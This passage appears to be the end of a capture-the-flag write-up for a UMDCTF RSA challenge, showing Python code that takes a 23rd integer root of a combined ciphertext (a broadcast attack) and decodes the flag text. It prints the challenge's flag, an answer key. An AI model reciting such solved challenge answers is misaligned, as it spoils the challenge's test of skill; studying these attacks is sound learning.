1926390488103701183005088455880294616257504301177911908054838275251845108130699012220396853928990752595250323958614201653264445678016175816329494187224771129535339639994294019636369281323499904088690739171378766796560111502355236789644527670728419951752529189027847277596789546170991207652765367519167980875979050619170207947588464172069208339166318567507452285055207814324950174487475183420757956291140465216324949726151727161990700523657067003825992789614806470361176509477622526198527148025600732943099203188609785397832022106189898842648642710273985386831819588210146289785658983338708096456898729302500584785461079457232980431438718388193649039639143583497749482060323905010325980356455686171057542416650733399658422642837838807456340680927401706878880895092723729057491368271601109340932627506332617636851758271838412041679898550810182718637237914523505078935043444196027746948845413096752064607070528745408648340087126704626504746460837961142007473966302754798586792797944934941876569271134620485326499342969271624501480994275452349579585726071662569441126228133242771107902031929692468331650268012307884109294296983374128511114982518478429675524269574383193108083791632684037748594019418036388631577500298135905137608684995397531215281965726914032490141191637940063302717976117646823467048312422082725157167004636810478199561638535317144049171779363630887730776512473405830103440623606008202770956902952175053427862934916348314334048974708226385558071866455630667529513602142750578454343988398231653330816390910448793493109046470257576660166688935508608768307415595027629748733714649785849427196534435000520565166466604508037942440550019597059640804878985928663644848659652772277588504685021122739683662135470141841593499754535422347299567223976684522863545715704132020911896160167973921675570344907377541026551443800362240338784107238381048415909111660815464080505264570693815523367362550070231086652275387323747267756203155911886723790645695415261671023168873723698358526953334584194791471783509038946510499119413437867540253949206621643088422108908817510043498875183205865379182499948972682868275086582584847352599955933745934135385940489201306099783799839645637327734292175832183809081261688083110737446371531544860885679613465555461358008320565826854837798990649922960607688042151616972043089405255028583687850705557939839042986917452843202646821305283294588412941380090284972974812142586011699969447305126930771867425597076242119118332684840357786373952354805120494467536237321218959089053820845127308724938888978660679528730543398286365999937888120168217885649683620223557123470706339916068594100521668483802542712355093495798450692654876153441717789899898589654828223867842530386763037561938301009287390940092910040719317514713705304936927004216925308135081599409988760757196968121810942170461736689664053777294449085579918628458530243482494533587464976793248974776256007095825463941473636185198293016520868908369187038972407100818973611070448312076195594200403524471063114550331653721597122540052347955704520136479400803709224052341998317840067680640400693655544955969773741976418903946281684337943780325970110235050148499815667980513714280864909517999906619977918354164309520396832268291788521906420345402278045842012283401816845646499620408746628663804008494671562053865845030284706888081149558007942286384078254264256257799756967418082224419759111884653839326133168546332768016596945087043185900536564853704801102534994146336389658017156714235463440047186739617358989091840503161495911849563023423254072174956697279559550662790211739447174583038503204742582049894212409033901670475886374286741314658727342873919289951017372041935611063172287844299358113363204241755198490660952434663824070593307996410367330173045649376481012752645772732481666688861884165969965065049178673239026235345964700305901982579525224151646121629217392930342654314357597510813866992042250952688191181568090525999481355739736850371248396729634219982337475241349204132578143993239515447744900524612012071858698626947233382454164035818893787179368155763162489525284982165481306984953859567600982981021480493550755636328767690384546520105959035731059052786753510710052836102222848825762306506256262981056432333209516520372182878737673101896787634482278246598802122205577346593336451228735166594376614677250460103754040826604701252684500910562349949378408250297048938086651894020614689373368860885464408830486120829401380948090084360138004455919248600524115789596022683978959815127626958158052079874306198662680445318594529768129858607204793636856624047979889415976306233106492089193981801930740115374264228826737476950965709490577203235373886982577002710136428237521598710704502594859066915953222604015303510300557996733021699413426587364400398487332848082404496123635118967478415872095389407825971558673298994835586168461383107271820406889108912791720655033845464166138302894379717255885017967049360696461950226219086590410402332651225511354797807218214043974019638431437889402116393648996825230393770685002516445628775703728292553275808884419636429949741295084196115447170406750434695516034942303589575922484194499111641854068787440508479045674066489539846005133255512497665265181085782125449626892689552624498349413496703533173211983511484916322312054294170689444108327820258997774695340079640590703643181274690941480891431662366107501638942138450953708809208107460245892196494983242959268858400459206514041099578537527523839158931254092706109942837591121026456457783869623143287428775796264150729937530840950149240551561153016663316088264629211566614202861228376396315312388094520837774149942605286191261051766762489758904060555037035464291937209368408582810589097249606751837122754845933693122232622316407363160202099693566186087856293863131738257892922698054999199476712923076780630671444987768097128446859466443586327840365206486952501463939333649739103259758523709252271997921887591859751879635021001087454648483914253858232986840010267877611788423208311930314742955867396729327434521193043852218514427740989709735252521105890862159276266104299450614176045252889554106782401962840728485270540318481554753974391690150137000806795983266705870689658316280957966093602716212024563125452694920671513618001577434440364594564931290637688438817781062120538262188070650008326132694631527223855993080994263487123105826785772704462258720316386237467459922603210545496185120719923565294164750238081129977558277074441409290657126616402873834509545033717786109429250849426491628227083121885659687378208296023987503903768562619582679558896291960582183362089930430650744871015443226421515513657013638403577793300426811369385507333848733029036213434504302482384822974337314665293861681299956880770180227889937261636988131753371555780194340447232062027712729115558245850457886279419106237992973279937149934529647990980440127054764632736070776529755267753494223140082843657937972307000140103523803953872353715628023748115884726768661020168692716926157159167939385376423134225457424712578986670905272647538661994679290117405687353725640948983171184422854152915838814299523058812751518756034276651926293188515618447215333397360467471527392714004378289689064732374860875848908474188317689630812172186515829232648098883620415216943242689444220449736143749901983520671136448367186632927581372858897994578792092248178314809026677301034120701875669381738830543677929472133249929177059722272480809932950619600412547839518501807215613472626807701513591300467994425608416139925340299963712174380134658768945945076409478570045950489185945998641293175659391507407985294509369399624409515817850255763768126196293704411528195993866618746765514656701479874719462365869204862630350809828118487721422446576161738215482016791490930736598794317361286538378701172547165857408979087415381318469772158773111316714883432411894553820529213471491602789029384241265103588958694218962449096022205909586514022042560778170758415690979235666874529225194601785824155922408394993195214927463766730589519986067933610871499469029487761450837252570901328066494258636851446211002046992676930171210745788539687063552311093186556689871818428668037834873930067461417609960248585428525475129806968005576177254235954947205113519574689464949343295928586124894039405226980598807287898793813794844632047387717860952675536913874112678330858987679340695721535314551550373664060743137173111761338428425931177741148184221932838549454253561108256697261938456096838880078440242770661429161861566527686681022923996389640526913153855284676715722434282871589343552908477073291742046039255284307394153494888880813673955228121665921023382133148796383661965579449448190879097674932278556684744256669978300278627644072807515066196415230389137246582752170052834861215515290251009448390639898862850914268449983589509036888274084492672003399885111502587712121871954132272192162578892413643954000857269632292470266123929554269413027591001256612869062146967168372392629707884742028924537584982433843282851945743539130741975077842031349620166186219529304386844848455850269245320337261318904402562729743143778710013943743995513969194971200534738460793184862665787605786727941873358264985676318135677918237553689126977869814376266579736984075542882105528193378732052604312507636809257791576644183232483055957033019340553082964684746668925514764465686059766030583639208584783223361857593817939068356183399384894312318922168508508282238310063267139681381199017899101426345697623190925362085812371168187151864766531759938127596160482727626370448577431409345795327194402377670271620269508403231588246703504300138098301663342835441137945708832824217342063862138390304414374500717171369199586408828080879614080153717373965489232962347350273805716859547208236018231038290661781105891101189555084511875314445440992134398977470662815716897202781590915564477313947204817939430260982654625036073642056434483524027393607478731453033091729448668267727440361119944861883658867194148338342667815394856685310528202144188802442723567295527913430935921839560534833234549560547862012264847798602398551457619743121339058774614623317637767897593795438295860389507930980867394252418231480099710060375011564059372988294511073020998179872850277609033404278130475507454532489580442581459442954291409798970094886571540654573809256519047185652680897363580510923193221613297169268821838058727987575759815116726152199487963571342248272642837513848129436296510629020700136791707624411354697442676139551317009336655946824137933262258153296413067133190392050547665497005200345511344308421920781129332097133139818279100132794047626377172002772480262429641607519296001703589491759218430617467233570538138165038657850411154086749757504324172387456345222943350069077294891928224299049588673040599162401198249345444069486137422876926343306580041679530323761515906341556512924783639419085230699400601301967189640580626671227538100446860451344415334123949034809941393836987745089861340071705459958603486946616902719560747868194312546116713976026108430146422244860112013643056621713834624950675122533693271194021550116048587526929258695482060500336635995273494195660828704478920529815073043121117005077936891836577882343773079619807904189593910107289125314142379071903167512713548499771077655108188045901135346232720749461439305426094106663136016420196375353065048700636012247604831272813974895038135848075406988210909599972999457216066112387873426979663546467755732676632377927146639861606468611466552680783539610222802002694805392041552344216715217287901750300500468622624301220574435507548124954641823865412611099426698444254947156485780013121763306426167409745094632142587362415697371545656241886258023458971786988644978756512398264254906747187695259250303387031202501501405400421638594482807992953970994987855543874396756737825212125182064772621171723771916093432618736262254639101911562250430072288764787192161838297079207032415032695475907642646213229460210907693607019228578581577276933563458251158833612872316392762494900051818688577539114388673515150956152879261016505619236278050702408908539844294153911592310166995581414216855557578339680919783461534911786353719752004993616396273566592920298569636650678424020855748447)
```

```python
import gmpy2
m23 = 54442102057757927511639425841438955248293134344655224749535359401816575839400412456832241078743274472268060115980463075792802496315756346223605463042968120725686010733593718719985515840511451749248322285632148289911597718573538505327191022484690801300618762812665976255984643538776323034611286217264372173299497350562891873803041190472126726015563846514305497037845788237659829984830263744438540265642158987133270227685598970517891038840131524861738908457779168057205558678326539559654928328086093794989547481758499922210431229927845105235138233158179529795305674094135271851899172018300468475811952418608383403487090260972375210346106542722525262217105607387479190719730001614920541668612955655548988967949186762397413839976248328429484759466018751121628729453732096967513300297428834714532222664000856658708408049382660596386879883766605596823531673332092310381571952842198758550290185802192993372708741737373603200893643404782226517824418909733263570527191275392827177208003173226136654266931152590136722539348644819187776538651479158541011732009715488575669039998305340208830341842454572087563296537632854937775617674388447948593951011142796878146892106318957612167234837112199256919749093716850506828869579015858055457714150834413303472806701096358960118853802567658428703370664303029579884645325634231197366458809492231519651659460089558888047704997587055193854451937453649596556112068452456869328832695568536643720153806002081236547594085212262321683633194558042081982701612759015757369482809642346123376974492698557079699540035970183631060680633073040910986632671961658318848939359719094982076098059228306409959334491762805114902718864439719958477059167027671920462346509449920068065336221097280672786557326772020152218057157276842067062742221845815890276002793325951328522965638202430192652706754878026775443155114659749978586026820110490095342058286319728268963900393735842843982323658960995040003521580224942370288724447953301911777794060103429567907444208264080986611835339716031573756152421901512202320549571894307659416805038675671256964515976088599345934745274884068236285885935588795087907662922544405814418221024465600209771740389252382582461190891187196524946214441440943140421791437461605480216456331826482046281344441218403824214722173766545519638300639869605707450614785457923491324548946997874150634378665200515604069083244298317318680871798090834071931778278741446092986277850038874794129417546727542567635270464382987492933597990524140004892680226010188510462126091947047600131949835818955288758411862544545974979938585777337024291073515925992412285246463181212543990730287416908213237063368009889484079436850037126097649310448461112280990478119780456586840660007618577576916971409615305968836646270170811787734081217834421850804826953681915851082840255851841790049391231552026187835575525752342446204167440539767074397500642926719619522142014573245687700712439815262302925266571665430247509632236643142115171338342946151550549287581859798447995887804241268847578908368119182989853360005232783914254537895995741017633493473033889659744964888678754604881786187641798749721783677191696482603763900714808291527545087783406413633107660394730257331144276883651511362456237276638668044584468783560399706437739887322660629398199854928085472184497074706518369210904144701540105465403432180666530926367041317784298748977573436776551169134152655388015903574472298830385235531186788534205053148262986488725667990960365036279390185871140831418805901836568559149446448071809287332187648336227382625619400498470991746862158613749760963344396896755811224632086613744893814751932301109656648063620107199785907511478011075024293176891597409319198819819341981357707901874792418431014275229764905133197487505959063135672762149087187118479334636534729145212681768481976927755131444553898263135879197534510476172328899246908546502215598017088678478462988930017153641341202606413845682351884054623076117055255499369451815758840649700628222208566831645950846956155814087978846457271518071812442504090686884121237718304382392717192649174557715732616482757494173557844927998304677281479835368394209694173088988619381556080502910221102996113161717672875390367640807228382277955692399564370970963771305337727401384509247936765276890534244144146394709556428325894557307216196984652274175335720165695580840807310325070667677811310747812741709176637048261424856818255362004570222549073961853685625626502921105573176784201690880632111586123392844863066473839734652651758050040315614139710447288285129249935912440025506544551570558097476551166348361878674379430798421276923873461505795996951331087838069509118102348609301405547270529731898003302116911156526571032843936829854685101791879062712431840628977712275136570471846413858266307630845495934558102090841460897186048159266286367278614459095010765346679531843483625622758254771197976418788757490030424884467685026544240989369557062034048607545463451182487377517618564464488690560901356441509431074975217846751571809436871282933556192236439318957350547509226088452196347235353324771460534815600348271318035806410552348103757483009285091563972273932085493814253474830608803045457573705053786556825412188016201996976995128707522723235867940746982498200033824173729564470376111839899950023164907644313270490495306075371355231252150260625469362803615521040396495289801591766530036680799433872327612185807197607563512097503022550384425615069715169073520497041057111401438352077211185018702332425221345418622321638193704459599982113842268324227533211497359934759323896474376928311599929792893623068305690707582715737260099271329447703750895492429184364397707019624304353758322723717241059358978001188195667164062320426868728793343073220191877003820333534054026385190896498151362995018830545110723889474726765962988084451710969003989677338479522277685036252172887660714169449708374850394346157544416664226812029058768628421945665085904788639039388867909109469622403474462043205847858160082986599154228013757521633494110984397146372525332529652944735649994218369710884119710166863647366306489428594418298273655887213311844584597121181978117089569235863224825752899844612854843029288604452653569062125188064529379136288488220328388484658296082412194339145516692197503128762337538545151932504707210683318209881989416851966661442751028777009878321253709569495459531056623418735791926647975525867239826032789211052920609502787051542213521301228719564873395643470625754747100516539503172724354555337160618738749674683458361378361382463308134388009851972311429590074652146654379909180155479969852168476646467967950606570962001024649538757348303321332524863512166077521311113327677320299104204107116471710051072907886214985035900468817823756472490310634198256747945596156130135967355797713273083040226841729134373820924726994452681673503405591023487698805502112910451979379109970694906955034745076432749624577630107401844168599233914357374632248797107514047582871654418066801034145306608289571002732956529033990818902485311217054095833727320580272274456732054482154356883332278876956607955538320863800250944713333894676111156306696375218929321965786164581855838243153012657550817275345864160366580569653
print(gmpy2.iroot(m23,23))
```

output

```commandline
(mpz(13150845956946746250100902536397018956586635593211871208044657052203700247804915093769142842837480650899265765067875045299371455492088973745784909770225372976654867869388810440016413411764612140929528084880556753780289854448170958922561820646834578498463382083172252932802500425581388905633207267376839019667837), True)
```

```python
from Crypto.Util.number import *
m = 13150845956946746250100902536397018956586635593211871208044657052203700247804915093769142842837480650899265765067875045299371455492088973745784909770225372976654867869388810440016413411764612140929528084880556753780289854448170958922561820646834578498463382083172252932802500425581388905633207267376839019667837
print(long_to_bytes(m))
```

output

```commandline
b"I'm just patiently waiting for someone to finally be able to decrypt this message. UMDCTF{y0u_r3ally_kn0w_y0ur_br04dc45t_4tt4ck!}"
```

`Flag: UMDCTF{y0u_r3ally_kn0w_y0ur_br04dc45t_4tt4ck!}`






